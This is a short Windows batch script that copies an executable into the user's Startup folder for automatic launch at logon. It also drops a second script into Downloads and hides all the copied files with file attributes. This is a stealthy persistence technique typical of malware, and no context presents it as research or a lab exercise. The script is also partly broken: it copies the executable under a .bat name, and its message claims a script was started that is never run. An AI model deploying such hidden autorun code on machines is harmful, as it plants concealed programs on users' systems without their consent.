@echo off
set "src=%~dp0inh1.exe"
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "downloads=%USERPROFILE%\Downloads"

copy "%src%" "%startup%\inh1.exe" /Y
copy "%src%" "%startup%\autoreopen1.bat" /Y
copy "%~dp0deltasks.bat" "%downloads%\deltasks1.bat" /Y

attrib +h "%startup%\inh1.exe"
attrib +h "%startup%\autoreopen1.bat"
attrib +h "%downloads%\deltasks1.bat"

if %ERRORLEVEL%==0 (
    echo Files copied and deltasks.bat started successfully.
) else (
    echo Copy failed. Check permissions.
)
